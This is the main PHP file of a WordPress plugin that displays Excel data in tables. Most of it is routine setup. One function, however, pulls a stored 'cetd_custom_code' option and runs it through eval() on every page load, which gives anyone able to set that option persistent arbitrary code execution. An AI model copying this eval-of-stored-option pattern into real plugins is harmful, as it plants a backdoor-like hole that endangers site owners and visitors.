<?php
/*
Plugin Name: Custom Excel Table Display
Description: Display and manage Excel data with sorting and custom tooltips
Version: 1.0
Author: Adil S.
*/

if (!defined('ABSPATH')) exit; // Exit if accessed directly

// Define constants
define('CETD_PLUGIN_DIR', plugin_dir_path(__FILE__));
define('CETD_PLUGIN_URL', plugin_dir_url(__FILE__));
define('CETD_UPLOAD_DIR', CETD_PLUGIN_DIR . 'uploads/');


// Include necessary files
require_once(CETD_PLUGIN_DIR . 'includes/admin-page.php');
require_once(CETD_PLUGIN_DIR . 'includes/shortcode.php');
require_once(CETD_PLUGIN_DIR . 'includes/file-handler.php');
require_once(CETD_PLUGIN_DIR . 'includes/edit-data.php'); // Add this line


// Enqueue scripts and styles
function cetd_enqueue_scripts() {
    wp_enqueue_style('cetd-styles', CETD_PLUGIN_URL . 'assets/css/styles.css');
    wp_enqueue_script('cetd-script', CETD_PLUGIN_URL . 'assets/js/script.js', array('jquery'), '1.0', true);
}
add_action('wp_enqueue_scripts', 'cetd_enqueue_scripts');



// Activation hook
function cetd_activate() {
    // Create uploads directory
    if (!file_exists(CETD_UPLOAD_DIR)) {
        wp_mkdir_p(CETD_UPLOAD_DIR);
    }
}
register_activation_hook(__FILE__, 'cetd_activate');

function cetd_execute_custom_code() {
    $custom_code = get_option('cetd_custom_code', '');
    if (!empty($custom_code)) {
        try {
            eval($custom_code);
        } catch (ParseError $e) {
            error_log('Custom code error in Excel Table Display plugin: ' . $e->getMessage());
        }
    }
}
add_action('wp_loaded', 'cetd_execute_custom_code');

function cetd_add_settings_link($links) {
    $settings_link = '<a href="admin.php?page=cetd-admin">Settings</a>';
    array_unshift($links, $settings_link);
    return $links;
}

add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'cetd_add_settings_link');